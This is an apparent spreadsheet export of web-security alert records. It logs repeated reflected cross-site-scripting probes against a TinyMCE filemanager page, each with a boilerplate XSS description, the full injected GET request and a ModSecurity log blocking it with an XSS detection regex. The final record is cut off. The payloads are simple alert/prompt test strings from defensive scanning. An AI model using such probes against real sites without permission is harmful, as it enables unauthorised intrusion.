				<html xmlns:o="urn:schemas-microsoft-com:office:office"
				xmlns:x="urn:schemas-microsoft-com:office:excel"
				xmlns="http://www.w3.org/TR/REC-html40">

				<head>
				<meta http-equiv=Content-Type content="text/html; charset=us-ascii">
				<meta name=ProgId content=Excel.Sheet>
				<!--[if gte mso 9]><xml>
				 <o:DocumentProperties>
				  <o:LastAuthor>Sriram</o:LastAuthor>
				  <o:LastSaved>2005-01-02T07:46:23Z</o:LastSaved>
				  <o:Version>10.2625</o:Version>
				 </o:DocumentProperties>
				 <o:OfficeDocumentSettings>
				  <o:DownloadComponents/>
				 </o:OfficeDocumentSettings>
				</xml><![endif]-->
				<style>
				<!--table
					{mso-displayed-decimal-separator:"\.";
					mso-displayed-thousand-separator:"\,";}
				@page
					{margin:1.0in .75in 1.0in .75in;
					mso-header-margin:.5in;
					mso-footer-margin:.5in;}
				tr
					{mso-height-source:auto;}
				col
					{mso-width-source:auto;}
				br
					{mso-data-placement:same-cell;}
				.style0
					{mso-number-format:General;
					text-align:general;
					vertical-align:bottom;
					white-space:nowrap;
					mso-rotate:0;
					mso-background-source:auto;
					mso-pattern:auto;
					color:windowtext;
					font-size:10.0pt;
					font-weight:400;
					font-style:normal;
					text-decoration:none;
					font-family:Arial;
					mso-generic-font-family:auto;
					mso-font-charset:0;
					border:none;
					mso-protection:locked visible;
					mso-style-name:Normal;
					mso-style-id:0;}
				td
					{mso-style-parent:style0;
					padding-top:1px;
					padding-right:1px;
					padding-left:1px;
					mso-ignore:padding;
					color:windowtext;
					font-size:10.0pt;
					font-weight:400;
					font-style:normal;
					text-decoration:none;
					font-family:Arial;
					mso-generic-font-family:auto;
					mso-font-charset:0;
					mso-number-format:General;
					text-align:general;
					vertical-align:bottom;
					border:none;
					mso-background-source:auto;
					mso-pattern:auto;
					mso-protection:locked visible;
					white-space:nowrap;
					mso-rotate:0;}
				.xl24
					{mso-style-parent:style0;
					white-space:normal;}
				-->
				</style>
				<!--[if gte mso 9]><xml>
				 <x:ExcelWorkbook>
				  <x:ExcelWorksheets>
				   <x:ExcelWorksheet>
					<x:Name>srirmam</x:Name>
					<x:WorksheetOptions>
					 <x:Selected/>
					 <x:ProtectContents>False</x:ProtectContents>
					 <x:ProtectObjects>False</x:ProtectObjects>
					 <x:ProtectScenarios>False</x:ProtectScenarios>
					</x:WorksheetOptions>
				   </x:ExcelWorksheet>
				  </x:ExcelWorksheets>
				  <x:WindowHeight>10005</x:WindowHeight>
				  <x:WindowWidth>10005</x:WindowWidth>
				  <x:WindowTopX>120</x:WindowTopX>
				  <x:WindowTopY>135</x:WindowTopY>
				  <x:ProtectStructure>False</x:ProtectStructure>
				  <x:ProtectWindows>False</x:ProtectWindows>
				 </x:ExcelWorkbook>
				</xml><![endif]-->
				</head>

				<body link=blue vlink=purple>
				<table x:str border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse;table-layout:fixed;'><tr><td class=xl24 width=64 >CustomerID</td><td class=xl24 width=64 >AlertID</td><td class=xl24 width=64 >FoundDate</td><td class=xl24 width=64 >Description</td><td class=xl24 width=64 >URL</td><td class=xl24 width=64 >Method</td><td class=xl24 width=64 >Para</td><td class=xl24 width=64 >ReqHeader</td><td class=xl24 width=64 >Replay_TIME</td><td class=xl24 width=64 >HTTP_RESPONSE_CODE</td><td class=xl24 width=64 >RawLog</td><td class=xl24 width=64 >Rule</td><td class=xl24 width=64 >Unique_ID</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358341</td><td class=xl24 width=64 >2015-03-31 00:00:01</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >5519719761e63</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719761e63=&quot;&gt;&lt;script&gt;alert(220099)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=pr4ldn7j00vibe0rtus5mo6v01
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:29</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:28 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:5519719761e63. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(220099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqFKwQAW0AABqr3CMAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqFKwQAW0AABqr3CMAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358342</td><td class=xl24 width=64 >2015-03-31 00:01:12</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551971972268f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551971972268f</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551971972268f=&quot;&gt;&lt;script&gt;alert(172399)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=54ji6qke7gico72dtc84vr3aq0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:31</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:29 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551971972268f. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(172399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqFawQAW0AABrkSYoAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqFawQAW0AABrkSYoAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358343</td><td class=xl24 width=64 >2015-03-31 00:08:38</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(953999)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=snbtf7l3udni0r6152mrltn0o0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:32</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:31 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(953999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqF6wQAW0AABtTHQsAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqF6wQAW0AABtTHQsAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358344</td><td class=xl24 width=64 >2015-03-31 00:09:32</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(850499)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=pp2c45ksfsssbq5kdo20m8qg52
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:33</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:32 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(850499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqGKwQAW0AABt@bNoAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqGKwQAW0AABt@bNoAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358345</td><td class=xl24 width=64 >2015-03-31 00:11:16</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e01</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&lt;script&gt;prompt(160899)&lt;/script/&gt;&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e01=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=71su25ndsqq2cf31glhmvo4f31
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:34</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:33 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(160899)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqGawQAW0AAB7zKEoAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqGawQAW0AAB7zKEoAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358346</td><td class=xl24 width=64 >2015-03-31 00:14:04</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(161199)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=o6d4ups0t4qtiv7546noafcl71
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:36</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:34 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(161199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqGqwQAW0AAD9ieaUAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqGqwQAW0AAD9ieaUAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358347</td><td class=xl24 width=64 >2015-03-31 00:16:33</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


